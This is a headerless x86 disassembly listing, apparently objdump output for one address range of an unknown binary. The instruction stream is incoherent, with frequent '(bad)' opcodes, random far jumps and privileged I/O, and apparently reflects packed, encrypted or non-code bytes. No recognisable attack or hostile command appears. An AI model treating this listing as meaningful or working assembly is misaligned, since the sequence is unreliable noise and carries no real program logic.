  41a2d2:	and    dh,BYTE PTR [edx-0x2a]
  41a2d5:	inc    ebx
  41a2d6:	add    cl,bh
  41a2d8:	sti    
  41a2d9:	dec    ecx
  41a2da:	mov    ecx,0xfcb8b46f
  41a2df:	les    ecx,FWORD PTR [ebp+eax*4-0x3729c268]
  41a2e6:	cmp    al,0xda
  41a2e8:	dec    eax
  41a2e9:	or     edi,ecx
  41a2eb:	jbe    0x41a335
  41a2ed:	jmp    0x6e76:0x91bbc76f
  41a2f4:	outs   dx,BYTE PTR ds:[esi]
  41a2f5:	cmc    
  41a2f6:	dec    ecx
  41a2f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2f8:	push   edx
  41a2f9:	adc    ch,BYTE PTR [ebx+0x4c33b397]
  41a2ff:	repnz jmp 0x827a:0x75bb7cd7
  41a307:	add    ch,BYTE PTR [ebx]
  41a309:	rol    DWORD PTR [eax],1
  41a30b:	hlt    
  41a30c:	mov    dl,0x3a
  41a30e:	adc    al,0x67
  41a310:	lods   eax,DWORD PTR ds:[esi]
  41a311:	sahf   
  41a312:	je     0x41a294
  41a314:	(bad)  
  41a315:	dec    ebx
  41a316:	iret   
  41a317:	test   eax,0xaa7461cc
  41a31c:	inc    ebx
  41a31d:	xor    BYTE PTR [ecx-0x6ae1c6e0],bl
  41a323:	std    
  41a324:	push   eax
  41a325:	pop    es
  41a326:	mov    esp,0xa90b05d6
  41a32b:	or     eax,esp
  41a32d:	rol    DWORD PTR [edi-0x18f8f60a],cl
  41a333:	or     dh,bl
  41a335:	scas   eax,DWORD PTR es:[edi]
  41a336:	(bad)  
  41a337:	arpl   WORD PTR ds:0x1f66d909,di
  41a33d:	icebp  
  41a33e:	inc    esp
  41a33f:	pop    edx
  41a340:	data16 or al,0x8c
  41a343:	pop    esi
  41a344:	sar    BYTE PTR [edi-0x1e],0x74
  41a348:	scas   eax,DWORD PTR es:[edi]
  41a349:	cmp    eax,DWORD PTR [eax-0x3a]
  41a34c:	fistp  DWORD PTR ds:0x6fc3927b
  41a352:	ficom  DWORD PTR ds:0x3af7be02
  41a358:	in     al,0x71
  41a35a:	bound  ecx,QWORD PTR [ebp+0x2c]
  41a35d:	dec    ebx
  41a35e:	std    
  41a35f:	jnp    0x41a2ee
  41a361:	repz shr BYTE PTR [ebx],cl
  41a364:	scas   al,BYTE PTR es:[edi]
  41a365:	sbb    DWORD PTR [eax-0x4c],edx
  41a368:	sub    DWORD PTR [edx+0x50fdebaf],ebp
  41a36e:	jnp    0x41a3a5
  41a370:	pop    edi
  41a371:	rcl    DWORD PTR [edx],0xe7
  41a374:	jg     0x41a365
  41a376:	out    0xfe,eax
  41a378:	xchg   esp,eax
  41a379:	push   ebx
  41a37a:	fcomp  DWORD PTR [ebx+0x58]
  41a37d:	pop    ecx
  41a37e:	aam    0xf6
  41a380:	lods   eax,DWORD PTR ds:[esi]
  41a381:	retf   
  41a382:	in     eax,dx
  41a383:	mov    BYTE PTR [edi-0x13],0xed
  41a387:	pop    eax
  41a388:	adc    dh,bl
  41a38a:	mov    bl,0x31
  41a38c:	out    0x3e,al
  41a38e:	(bad)  
  41a38f:	cdq    
  41a390:	ret    
  41a391:	or     BYTE PTR [ebp+0x36bb3ecd],ah
  41a397:	cmp    BYTE PTR [edx+0xb],dh
  41a39a:	pop    es
  41a39b:	mov    edx,0xf20396d5
  41a3a0:	adc    edx,DWORD PTR [esp+edx*1-0x15]
  41a3a4:	mov    bh,0x2c
  41a3a6:	inc    esp
  41a3a7:	(bad)  
  41a3a9:	mov    ds:0x1c799986,al
  41a3ae:	dec    edi
  41a3af:	imul   ebx,DWORD PTR [edx+0x1cde966f],0xd4893735
  41a3b9:	mov    bl,0x69
  41a3bb:	pop    ecx
  41a3bc:	push   edx
  41a3bd:	test   eax,0xaa23edfe
  41a3c2:	sbb    al,BYTE PTR [esi+0xd418246]
  41a3c8:	hlt    
  41a3c9:	cmp    DWORD PTR [ebx],ecx
  41a3cb:	rcr    BYTE PTR [edi],0x28
  41a3ce:	lock inc edi
  41a3d0:	inc    esi
  41a3d1:	dec    eax
  41a3d2:	mov    ebx,0xd5a8e290
  41a3d7:	pop    ss
  41a3d8:	mov    esp,0xa088d757
  41a3dd:	and    DWORD PTR [ebp+0x79],esp
  41a3e0:	push   cs
  41a3e1:	lods   al,BYTE PTR ds:[esi]
  41a3e2:	fdivr  st(3),st
  41a3e4:	push   ebx
  41a3e5:	dec    ebp
  41a3e6:	push   cs
  41a3e7:	mov    bl,0xde
  41a3e9:	mov    eax,0x63fe20e7
  41a3ee:	inc    edx
  41a3ef:	push   ebp
  41a3f0:	push   ebp
  41a3f1:	mov    bh,0x73
  41a3f3:	popf   
  41a3f4:	cmp    BYTE PTR [edi+edi*8-0x7c],al
  41a3f8:	sar    ch,0xc6
  41a3fb:	out    0x7,al
  41a3fd:	std    
  41a3fe:	repz add al,0xfe
  41a401:	mov    ds:0x15673a0b,al
  41a406:	mov    WORD PTR [eax+0x4ea57a9d],?
  41a40c:	(bad)  
  41a40d:	outs   dx,DWORD PTR ds:[esi]
  41a40e:	not    DWORD PTR [edx+0x2a90e1b]
  41a414:	pop    edi
  41a415:	pop    ebp
  41a417:	cdq    
  41a418:	fadd   QWORD PTR [ebp+0x68]
  41a41b:	xlat   BYTE PTR ds:[ebx]
  41a41c:	pop    ebp
  41a41d:	sbb    DWORD PTR [ebx],eax
  41a41f:	inc    esp
  41a420:	cmp    al,0xa2
  41a422:	inc    eax
  41a423:	sbb    BYTE PTR [ebx+0x62],bl
  41a426:	retf   
  41a427:	fimul  DWORD PTR [eax]
  41a429:	pop    edi
  41a42a:	sahf   
  41a42b:	mov    es:0x9318f42,eax
  41a431:	(bad)  
  41a433:	imul   edi,esi,0xedaa2c33
  41a439:	mov    bl,BYTE PTR [eax+0x41]
  41a43c:	mov    esi,0x617754c
  41a441:	xlat   BYTE PTR ds:[ebx]
  41a442:	in     al,0x37
  41a444:	pop    ebp
  41a445:	or     al,0x3f
  41a447:	hlt    
  41a448:	jg     0x41a4ab
  41a44a:	mov    ds:0xd711fd70,eax
  41a44f:	xchg   edi,esp
  41a451:	cs jle 0x41a45f
  41a454:	mov    ds:0x7fb9c870,eax
  41a459:	mov    ah,0x35
  41a45b:	ret    
  41a45c:	rol    esi,cl
  41a45e:	push   ebp
  41a45f:	cdq    
  41a460:	jge    0x41a4d5
  41a462:	loopne 0x41a495
  41a464:	adc    eax,0xc6312fa4
  41a469:	dec    esp
  41a46a:	not    ah
  41a46c:	clc    
  41a46d:	iret   
  41a46e:	inc    ebp
  41a46f:	leave  
  41a470:	mov    edi,0x9d875f2b
  41a475:	lods   al,BYTE PTR ds:[esi]
  41a476:	outs   dx,BYTE PTR ds:[esi]
  41a477:	jbe    0x41a466
  41a479:	jp     0x41a4cb
  41a47b:	mov    esi,0xe577d190
  41a480:	dec    esi
  41a481:	loopne 0x41a4f3
  41a483:	or     BYTE PTR [eax],bl
  41a485:	pop    ds
  41a486:	nop
  41a487:	and    DWORD PTR [eax],edx
  41a489:	stc    
  41a48a:	rcr    DWORD PTR [esi-0xf],cl
  41a48d:	and    esi,DWORD PTR [esi]
  41a48f:	mov    eax,ds:0x197f0500
  41a494:	xchg   ecx,eax
  41a495:	sar    DWORD PTR [edx+0x57],1
  41a498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a499:	mov    bh,0xc9
  41a49b:	jmp    0x988d5b22
  41a4a0:	ret    0xc66
  41a4a3:	ret    
  41a4a4:	ins    BYTE PTR es:[edi],dx
  41a4a5:	aas    
  41a4a6:	call   0x4efa:0x6a41168a
  41a4ad:	lahf   
  41a4ae:	cmp    BYTE PTR [ebp+0x1c],0x90
  41a4b2:	and    BYTE PTR [ebx+ecx*1],0xa3
  41a4b6:	pushf  
  41a4b7:	cli    
  41a4b8:	push   es
  41a4b9:	jb     0x41a45e
  41a4bb:	mov    ah,0x21
  41a4bd:	push   esi
  41a4be:	pushw  es
  41a4c0:	shr    DWORD PTR [ecx-0x1b],cl
  41a4c3:	jp     0x41a482
  41a4c5:	test   eax,0x2f7d77f7
  41a4ca:	mov    ebp,DWORD PTR [edi]
  41a4cc:	push   edx
  41a4cd:	and    al,BYTE PTR [edi+0x38974229]
  41a4d3:	icebp  
  41a4d4:	popa   
  41a4d5:	mul    BYTE PTR [esp+eiz*2]
  41a4d8:	pushf  
  41a4d9:	mov    ebp,0xe8f4884a
  41a4de:	aas    
  41a4df:	imul   ebp,DWORD PTR [edx+eiz*8],0xffffffb5
  41a4e3:	or     ebx,eax
  41a4e5:	dec    edx
  41a4e6:	push   es
  41a4e7:	mov    ebx,0x41d74de3
  41a4ec:	dec    esi
  41a4ed:	pop    ebx
  41a4ee:	fimul  DWORD PTR [ebx+0x26ea64d8]
  41a4f4:	xchg   DWORD PTR es:[ebx+eax*4],eax
  41a4f8:	scas   eax,DWORD PTR es:[edi]
  41a4f9:	call   0x601f:0x938526f9
  41a500:	cmp    bh,BYTE PTR [edi]
  41a502:	enter  0xec25,0xbc
  41a506:	ins    DWORD PTR es:[edi],dx
  41a507:	or     eax,0xd3de46c4
  41a50c:	sti    
  41a50d:	data16 jg 0x41a58b
  41a510:	pop    esi
  41a511:	adc    BYTE PTR [esi-0x31],bl
  41a514:	out    dx,eax
  41a515:	or     ebx,edi
  41a517:	adc    ebx,DWORD PTR [esi+edx*1]
  41a51a:	jnp    0x41a513
  41a51c:	pop    ss
  41a51d:	add    BYTE PTR [esi-0x79],cl
  41a520:	pop    ebp
  41a521:	repz jle 0x41a57e
  41a524:	fdivr  st(6),st
  41a526:	sub    BYTE PTR [ebx-0x75],bl
  41a529:	lds    ebp,FWORD PTR [esi+0x4f]
  41a52c:	and    BYTE PTR [ecx-0x1df1dfbe],0xf8
  41a533:	mov    ds:0xa24ba53f,eax
  41a538:	fdiv   QWORD PTR [ebp-0x43]
  41a53b:	xchg   ecx,eax
  41a53c:	jmp    0x4d38034b
  41a541:	mul    DWORD PTR [eax]
  41a543:	(bad)  
  41a544:	xlat   BYTE PTR ds:[ebx]
  41a545:	dec    ebp
  41a546:	sub    esp,ebx
  41a548:	fbstp  TBYTE PTR [ebx-0x616ab879]
  41a54e:	inc    eax
  41a54f:	daa    
  41a550:	outs   dx,DWORD PTR ds:[esi]
  41a551:	jmp    0x41a4dc
  41a553:	lds    eax,FWORD PTR [edi+ecx*4+0x7960a865]
  41a55a:	mov    ebp,0x25312a1a
  41a55f:	in     eax,dx
  41a560:	adc    edx,edi
  41a562:	sub    edx,DWORD PTR [edx-0x81ffb60]
  41a568:	inc    ebx
  41a569:	push   0xc
  41a56b:	mov    cl,0x53
  41a56d:	loop   0x41a5a6
  41a56f:	dec    eax
  41a570:	aad    0x43
  41a572:	out    dx,al
  41a573:	jge    0x41a55b
  41a575:	mov    esi,0x93e07bb
  41a57a:	in     al,dx
  41a57b:	mov    ds:0x3b55c1a5,al
  41a580:	aas    
  41a581:	ins    DWORD PTR es:[edi],dx
  41a582:	repnz cmp DWORD PTR [ecx+0x2854259c],edx
  41a589:	mov    BYTE PTR [ebp-0x5be12702],bl
  41a58f:	mov    ds:0xb96423e7,eax
  41a594:	sti    
  41a595:	inc    edx
  41a596:	mov    ch,0x97
  41a598:	ja     0x41a5cc
  41a59a:	aad    0x2a
  41a59c:	imul   edi,DWORD PTR [eax-0x378d5fdc],0x799b4d1d
  41a5a6:	xor    al,0x4f
  41a5a8:	stos   BYTE PTR es:[edi],al
  41a5a9:	imul   DWORD PTR [ebx]
  41a5ab:	cmp    DWORD PTR [edx],edx
  41a5ad:	(bad)  
  41a5af:	jecxz  0x41a5ac
  41a5b1:	push   0x21
  41a5b3:	iret   
  41a5b4:	jns    0x41a5e2
  41a5b6:	pop    es
  41a5b7:	ss mov bl,0xb0
  41a5ba:	push   edx
  41a5bb:	cmp    esp,edi
  41a5bd:	ds addr16 hlt 
  41a5c0:	pop    esi
  41a5c1:	xlat   BYTE PTR ds:[ebx]
  41a5c2:	adc    eax,0xf4b6d128
  41a5c7:	pop    eax
  41a5c8:	mov    ds:0xff9a1a6b,eax
  41a5cd:	mov    al,0xf9
  41a5cf:	shl    DWORD PTR [edx+0x55],1
  41a5d2:	pop    eax
  41a5d4:	add    eax,ebp
  41a5d6:	cmp    esp,DWORD PTR [esi]
  41a5d8:	mov    ds:0xc0251c8e,al
  41a5dd:	or     bh,0x9b
  41a5e0:	fsubr  QWORD PTR [ebp+edx*2+0x2]
  41a5e4:	mov    ds:0x5dddcb67,eax
  41a5e9:	repz (bad) 
  41a5eb:	lock mov ecx,0x538a0c0b
  41a5f1:	and    dl,dh
  41a5f3:	test   eax,0xe03cbeb2
  41a5f8:	push   edi
  41a5f9:	lock xchg esi,eax
  41a5fb:	jmp    0xe57e:0xa3227c24
  41a602:	inc    esi
  41a603:	mov    esi,0x73232446
  41a608:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a609:	imul   eax,DWORD PTR [eax-0x347bd61],0xce975328
  41a613:	ss in  al,0x96
  41a616:	inc    edi
  41a617:	jne    0x41a5b3
  41a619:	mov    ecx,0x30b0aba8
  41a61e:	add    BYTE PTR [edi],0x6c
  41a621:	iret   
  41a622:	inc    esi
  41a623:	sbb    ecx,eax
  41a625:	test   al,0x3e
  41a627:	test   DWORD PTR [ecx-0x27c4bed3],esp
  41a62d:	sbb    DWORD PTR [ebp-0x50ae21b6],ecx
  41a633:	dec    ecx
  41a634:	jbe    0x41a6ab
  41a636:	cld    
  41a637:	jmp    0x41a65d
  41a639:	add    al,0x99
  41a63b:	test   eax,0x49ceaa8a
  41a640:	adc    ah,BYTE PTR [esp+ebx*2+0x7f395d01]
  41a647:	inc    edi
  41a648:	retf   
  41a649:	mov    eax,ds:0xffe66525
  41a64e:	(bad)  
  41a64f:	inc    eax
  41a650:	popf   
  41a651:	out    dx,eax
  41a652:	sub    esp,0x5a5ac17a
  41a658:	lods   al,BYTE PTR ds:[esi]
  41a659:	fisubr WORD PTR [edx+0x5a510d40]
  41a65f:	test   BYTE PTR [edi-0x75],bl
  41a662:	pop    edx
  41a663:	or     eax,DWORD PTR [eax]
  41a665:	in     eax,0xb4
  41a667:	push   ds
  41a668:	add    eax,0xc536922d
  41a66d:	aaa    
  41a66e:	cmc    
  41a66f:	clc    
  41a670:	mov    edx,0x8d86561a
  41a675:	mov    esi,0x6ea7ae73
  41a67a:	stc    
  41a67b:	out    0x8e,al
  41a67d:	and    DWORD PTR [ecx+0x4e94e63c],esi
  41a683:	add    dl,al
  41a685:	std    
  41a686:	loop   0x41a6f5
  41a688:	mov    BYTE PTR [esp+ecx*1-0x326c96fe],ch
  41a68f:	and    DWORD PTR [ebx],eax
  41a691:	dec    esi
  41a692:	(bad)  
  41a693:	stc    
  41a694:	jmp    0x29cf3bd8
  41a699:	ret    0x7b09
  41a69c:	es jge 0x41a662
  41a69f:	cmp    esp,DWORD PTR [ebp+eiz*2+0x3b]
  41a6a3:	gs jmp 0x4dc5322f
  41a6a9:	lahf   
  41a6aa:	jb     0x41a67f
  41a6ac:	fcomp  DWORD PTR [edx-0x12dad64c]
  41a6b2:	ins    DWORD PTR es:[edi],dx
  41a6b3:	push   ecx
  41a6b4:	sub    ah,ah
  41a6b6:	ss mov cl,0x34
  41a6b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6ba:	pop    ds
  41a6bb:	jle    0x41a662
  41a6bd:	mov    edx,?
  41a6bf:	dec    edi
  41a6c0:	and    BYTE PTR [ecx-0x10],ah
  41a6c3:	add    al,0xc1
  41a6c5:	jmp    0x41a64f
  41a6c7:	test   DWORD PTR [ebx],eax
  41a6c9:	in     al,0xc0
  41a6cb:	jmp    edx
  41a6cd:	xor    BYTE PTR [edx-0x78],cl
  41a6d0:	xchg   DWORD PTR [esi+0xddafeae],edx
  41a6d6:	and    BYTE PTR [ecx],cl
  41a6d8:	push   0xffffff80
  41a6da:	int    0xe2
  41a6dc:	in     eax,dx
  41a6dd:	jo     0x41a686
  41a6df:	add    al,0xe4
  41a6e1:	or     dl,BYTE PTR [ecx+0x7e]
  41a6e4:	cwde   
  41a6e5:	fldenv [ebp+edx*1-0x1b]
  41a6e9:	mov    edx,0x3a65d74c
  41a6ee:	gs into 
  41a6f0:	push   esi
  41a6f1:	sbb    al,0xe6
  41a6f3:	fadd   DWORD PTR [edx-0x74]
  41a6f6:	sub    eax,0xfb05264c
  41a6fb:	sbb    eax,0xd94a4444
  41a700:	ret    0x2a7a
  41a703:	jbe    0x41a70a
  41a705:	fdiv   DWORD PTR [ebp+ebx*4+0x7f]
  41a709:	fidivr DWORD PTR [ecx-0xc]
  41a70c:	jno    0x41a693
  41a70e:	repz mov ebx,0xf46ea3d9
  41a714:	lock mov eax,0xf271136d
  41a71a:	mov    ds:0x9d031a6b,eax
  41a71f:	cmp    BYTE PTR [eax],cl
  41a721:	inc    eax
  41a722:	mov    ?,WORD PTR [ecx-0x69]
  41a725:	inc    esi
  41a726:	ss mov esi,0x276103e
  41a72c:	cs pop edx
  41a72e:	adc    eax,0xf0ff2e81
  41a733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a734:	mov    bh,0xbf
  41a736:	dec    edx
  41a737:	pop    ebp
  41a738:	outs   dx,DWORD PTR ds:[esi]
  41a739:	cwde   
  41a73a:	(bad)  
  41a73b:	lock mov ah,0xd5
  41a73e:	xor    bl,BYTE PTR ds:0xe04bf827
  41a744:	mov    DWORD PTR [eax+0x41],eax
  41a747:	lea    ebp,ds:0xbd774c64
  41a74d:	fist   DWORD PTR [eax]
  41a74f:	pop    es
  41a750:	pop    ebx
  41a751:	jmp    0x2003:0x64530c46
  41a758:	mov    bh,0x92
  41a75a:	sub    DWORD PTR [edx+0x7bd9960],ebp
  41a760:	push   ds
  41a761:	imul   eax,ecx,0xfffffff4
  41a764:	push   ecx
  41a765:	cld    
  41a766:	xor    edi,ebx
  41a768:	inc    edi
  41a769:	mov    ds:0x6108e416,eax
  41a76e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a76f:	xor    eax,0x2a4a7d95
  41a774:	jmp    0x41a7a4
  41a776:	ret    
  41a777:	xor    DWORD PTR [ebx-0x242137f2],ebx
  41a77d:	ror    bl,1
  41a77f:	mov    ebp,0xc126b67e
  41a784:	and    esp,DWORD PTR [ecx+0x7ef860ee]
  41a78a:	cmp    edi,DWORD PTR [eax+0x18374a0b]
  41a790:	xchg   esi,eax
  41a791:	pop    esp
  41a792:	test   eax,0x5dac336a
  41a797:	sbb    bh,al
  41a799:	inc    DWORD PTR [esi+0x6c]
  41a79c:	ins    DWORD PTR es:[edi],dx
  41a79d:	cmp    DWORD PTR [esi+0x20dae269],ecx
  41a7a3:	popa   
  41a7a4:	bound  ebx,QWORD PTR [edx+0x5f]
  41a7a7:	sbb    ah,BYTE PTR [ebx-0x7b]
  41a7aa:	ror    BYTE PTR [edx],cl
  41a7ac:	(bad)  
  41a7ad:	sub    al,0x17
  41a7af:	data16 adc al,0x30
  41a7b2:	mov    bl,0x83
  41a7b4:	jecxz  0x41a7fe
  41a7b6:	pop    esi
  41a7b7:	mov    ch,dh
  41a7b9:	mov    ebx,0xd193587e
  41a7be:	sub    eax,0xda89171c
  41a7c3:	adc    BYTE PTR [ecx-0x4f],dh
  41a7c6:	and    BYTE PTR [ebx],0xbb
  41a7c9:	int3   
  41a7ca:	sub    ecx,DWORD PTR [esp+eax*2-0x74cb3753]
  41a7d1:	dec    eax
  41a7d2:	ror    DWORD PTR [ecx],0xdf
  41a7d5:	ret    
  41a7d6:	dec    esp
  41a7d7:	fidiv  DWORD PTR [ecx+0x63]
  41a7da:	mov    ecx,0x13a3ba8c
  41a7df:	dec    edi
  41a7e0:	push   cs
  41a7e1:	dec    edi
  41a7e2:	xor    al,0xcf
  41a7e4:	mov    edi,0x8bbaf913
  41a7e9:	pop    esi
  41a7ea:	mov    WORD PTR [edi+esi*4+0x36],es
  41a7ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7ef:	mov    bl,0x57
  41a7f1:	ret    
  41a7f2:	cmp    al,0xce
  41a7f4:	push   ebx
  41a7f5:	in     eax,dx
  41a7f6:	adc    DWORD PTR [ebx+edi*4-0x3c],edx
  41a7fa:	icebp  
  41a7fb:	js     0x41a828
  41a7fd:	sbb    bl,BYTE PTR [edi-0x736042e3]
  41a803:	cmp    eax,0x9801c523
  41a808:	mov    ds:0xc1f6afab,al
  41a80d:	mov    gs:0x7668268,al
  41a813:	ror    BYTE PTR [ebp-0x22371e52],cl
  41a819:	mov    ecx,0xc71a20c
  41a81e:	mov    edx,0xf04f75d1
  41a823:	bound  ebp,QWORD PTR [ebp+eiz*1+0x477a5ccf]
  41a82a:	jmp    0x41a881
  41a82c:	jne    0x41a802
  41a82e:	dec    ebp
  41a82f:	pop    ebx
  41a830:	in     al,dx
  41a831:	leave  
  41a832:	ret    
  41a833:	fnsave ds:0x1e8f17
  41a839:	test   eax,0xf5fd39e1
  41a83e:	pop    ebx
  41a83f:	out    dx,eax
  41a840:	fldenv [ecx+0x43]
  41a843:	mov    ds:0xbacc449a,al
  41a848:	ret    0x79fb
  41a84b:	pop    ebx
  41a84c:	enter  0x243f,0x13
  41a850:	push   eax
  41a851:	dec    esp
  41a852:	(bad)  
  41a853:	ffreep st(5)
  41a855:	inc    eax
  41a856:	mov    DWORD PTR [edi+0x5e2ca0ea],ebp
  41a85c:	ja     0x41a890
  41a85e:	hlt    
  41a85f:	mov    ds:0x84d85173,al
  41a864:	xor    esp,DWORD PTR gs:[ebx]
  41a867:	xchg   edi,eax
  41a868:	cmp    eax,0xc8e2f687
  41a86d:	in     al,dx
  41a86e:	fisubr WORD PTR [esi-0x42]
  41a871:	mov    edi,ebx
  41a873:	add    al,0x82
  41a875:	ins    BYTE PTR es:[edi],dx
  41a876:	fld    TBYTE PTR [eax-0x3ed33664]
  41a87c:	popf   
  41a87d:	dec    esp
  41a87e:	mov    ebx,0x4e182489
  41a883:	int    0x6e
  41a885:	nop
  41a886:	and    al,BYTE PTR [eax-0x32]
  41a889:	leave  
  41a88a:	and    ah,dl
  41a88c:	mov    esp,0x55dc5a12
  41a891:	and    bh,BYTE PTR [esi-0x56]
  41a894:	sbb    eax,0x3134d952
  41a899:	push   ds
  41a89a:	jno    0x41a843
  41a89c:	xor    dh,0x62
  41a89f:	xor    ch,cl
  41a8a1:	ins    BYTE PTR es:[edi],dx
  41a8a2:	sbb    DWORD PTR [edx+esi*1],edi
  41a8a5:	mov    eax,0x7611c0d9
  41a8aa:	aas    
  41a8ab:	rol    dh,1
  41a8ad:	xor    ch,bh
  41a8af:	das    
  41a8b0:	fmul   DWORD PTR [ecx-0x7a]
  41a8b3:	jns    0x41a918
  41a8b5:	xchg   edx,eax
  41a8b6:	cld    
  41a8b7:	mov    esi,0xa431248f
  41a8bc:	xchg   DWORD PTR [ecx-0x61],ebx
  41a8bf:	lahf   
  41a8c0:	rcr    DWORD PTR [esi-0x4430e1a2],cl
  41a8c6:	push   0x56e29abf
  41a8cb:	mov    ds:0xde23c7f2,eax
  41a8d0:	xor    BYTE PTR [ecx-0x21c73141],dh
  41a8d6:	mov    WORD PTR [esi+esi*2-0x76],es
  41a8da:	jecxz  0x41a952
  41a8dc:	fst    QWORD PTR [eax-0x2d63f1]
  41a8e2:	into   
  41a8e3:	cmp    bh,BYTE PTR [ebp-0x52b7efe9]
  41a8e9:	xor    BYTE PTR [edi+0x44],0x84
  41a8ed:	fnstcw WORD PTR [ecx]
  41a8ef:	jge    0x41a8dd
  41a8f1:	inc    ecx
  41a8f2:	fld    TBYTE PTR [esi+ecx*4]
  41a8f5:	inc    eax
  41a8f6:	push   es
  41a8f7:	test   al,0xe6
  41a8f9:	dec    esi
  41a8fa:	adc    DWORD PTR [ecx-0x6d],ecx
  41a8fd:	retf   0xc1c5
  41a900:	mov    al,ds:0x97ff0768
  41a905:	(bad)  
  41a906:	sub    eax,0x4051c746
  41a90b:	mov    ebp,0xb8fdb208
  41a910:	vmaxps ymm5,ymm3,YMMWORD PTR [esi+0x4b130740]
  41a918:	and    eax,0xda30d18b
  41a91d:	imul   eax,DWORD PTR [esi-0x441a2895],0xcebb224a
  41a927:	stos   BYTE PTR es:[edi],al
  41a928:	jmp    0x9f85:0x6824b545
  41a92f:	lahf   
  41a930:	addr16 xchg esp,eax
  41a932:	dec    edi
  41a933:	xchg   esi,eax
  41a934:	mov    dh,0x38
  41a936:	jb     0x41a957
  41a938:	rcl    DWORD PTR [ecx-0xf],cl
  41a93b:	loopne 0x41a95b
  41a93d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a93e:	pop    edi
  41a93f:	aaa    
  41a940:	dec    eax
  41a941:	imul   esp,edi,0x2cd723e5
  41a947:	mov    al,ds:0x804edaba
  41a94c:	jecxz  0x41a956
  41a94e:	js     0x41a8e3
  41a950:	retf   
  41a951:	gs jl  0x41a916
  41a954:	xchg   ecx,eax
  41a955:	xor    bh,BYTE PTR [edx-0xe]
  41a958:	into   
  41a959:	ins    BYTE PTR es:[edi],dx
  41a95a:	shl    DWORD PTR [edi-0x66d8e60a],0x5d
  41a961:	dec    ebx
  41a962:	push   ecx
  41a963:	or     esi,ebp
  41a965:	icebp  
  41a966:	sbb    al,0xf1
  41a968:	mov    ah,0x56
  41a96a:	cmp    DWORD PTR [ecx+ecx*4-0x568b1f69],0x76962441
  41a975:	test   eax,0x8fafecd9
  41a97a:	lods   al,BYTE PTR ds:[esi]
  41a97b:	rol    DWORD PTR [ecx-0x63],0x3a
  41a97f:	mov    WORD PTR [edx+0x34],cs
  41a982:	cdq    
  41a983:	scas   al,BYTE PTR es:[edi]
  41a984:	out    0x94,eax
  41a986:	xor    cl,BYTE PTR [ebp-0xf]
  41a989:	test   DWORD PTR [edx-0x1e19479c],0xf4cf1b74
  41a993:	ret    0xc486
  41a996:	jge    0x41a989
  41a998:	nop
  41a999:	inc    edx
  41a99a:	cmp    eax,0x795260d3
  41a99f:	xchg   esp,eax
  41a9a0:	mov    ch,0x7a
  41a9a2:	imul   esp,esi,0xc6a8987a
  41a9a8:	cmp    al,0x0
  41a9aa:	imul   esi,DWORD PTR [ebp-0x26],0x68
  41a9ae:	jae    0x41a958
  41a9b0:	hlt    
  41a9b1:	or     eax,0x5c0c30e7
  41a9b6:	xor    al,0xc2
  41a9b8:	jae    0x41a9c6
  41a9ba:	call   0xc649:0xed3ffaca
  41a9c1:	in     al,dx
  41a9c2:	pop    es
  41a9c3:	adc    esp,0x26
  41a9c6:	xchg   edi,eax
  41a9c7:	imul   edi,ecx,0x719cdf97
  41a9cd:	and    dl,BYTE PTR [edx-0x32b4cbc8]
  41a9d3:	mov    al,0x25
  41a9d5:	out    0x47,al
  41a9d7:	ins    BYTE PTR es:[edi],dx
  41a9d8:	sbb    BYTE PTR [ecx+0x34],al
  41a9db:	dec    ebp
  41a9dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9dd:	cmp    dh,BYTE PTR [esi+0x2b]
  41a9e0:	add    eax,DWORD PTR [ecx-0x75]
  41a9e3:	mov    bh,0xd
  41a9e5:	xchg   ecx,eax
  41a9e6:	inc    esi
  41a9e7:	push   cs
  41a9e8:	or     al,0x7d
  41a9ea:	mov    gs,esi
  41a9ec:	mov    bl,0xdb
  41a9ee:	hlt    
  41a9ef:	test   esp,esp
  41a9f1:	call   0xc9e0:0x70e651df
  41a9f8:	jne    0x41a9c3
  41a9fa:	dec    ecx
  41a9fb:	(bad)  
  41a9fd:	jno    0x41a9eb
  41a9ff:	jae    0x41aa79
  41aa01:	mov    eax,0x3412e63b
  41aa06:	add    eax,0xbe82b05d
  41aa0b:	fmul   QWORD PTR [ecx-0x2a2e69fe]
  41aa11:	add    bh,ah
  41aa13:	in     eax,dx
  41aa14:	rcr    ch,1
  41aa16:	test   al,0x82
  41aa18:	mov    DWORD PTR [edi],esi
  41aa1a:	xor    edi,DWORD PTR [edx+0x4]
  41aa1d:	jl     0x41aa6c
  41aa1f:	push   eax
  41aa20:	inc    si
  41aa22:	cmp    ch,dh
  41aa24:	mov    cl,0x22
  41aa26:	lds    edx,FWORD PTR [ecx+0x6a7d8037]
  41aa2c:	cmp    al,0xc5
  41aa2e:	pusha  
  41aa2f:	push   ss
  41aa30:	outs   dx,DWORD PTR ds:[esi]
  41aa31:	push   ecx
  41aa32:	outs   dx,DWORD PTR ds:[esi]
  41aa33:	xchg   esi,eax
  41aa34:	arpl   WORD PTR [edx],cx
  41aa36:	out    0x75,al
  41aa38:	inc    eax
  41aa39:	stos   DWORD PTR es:[edi],eax
  41aa3a:	pop    esi
  41aa3b:	sbb    eax,DWORD PTR [ecx]
  41aa3d:	ins    DWORD PTR es:[edi],dx
  41aa3e:	and    al,0xad
  41aa40:	lahf   
  41aa41:	add    BYTE PTR [ebx],ch
  41aa43:	cdq    
  41aa44:	lods   eax,DWORD PTR ds:[esi]
  41aa45:	mov    ah,0x19
  41aa47:	leave  
  41aa48:	xchg   esp,eax
  41aa49:	(bad)  
  41aa4a:	retf   0xff5c
  41aa4d:	pop    edx
  41aa4e:	pop    eax
  41aa4f:	sbb    DWORD PTR [edx-0x4c30239f],ecx
  41aa55:	pop    ebx
  41aa56:	adc    DWORD PTR [edx+0x4c],eax
  41aa59:	cli    
  41aa5a:	push   ds
  41aa5b:	call   FWORD PTR [edi]
  41aa5d:	mov    dl,0x48
  41aa5f:	pop    ebp
  41aa60:	inc    esi
  41aa61:	inc    edi
  41aa62:	pop    esp
  41aa63:	repnz cmp al,0xc7
  41aa66:	nop
  41aa67:	pop    ebp
  41aa68:	stos   DWORD PTR es:[edi],eax
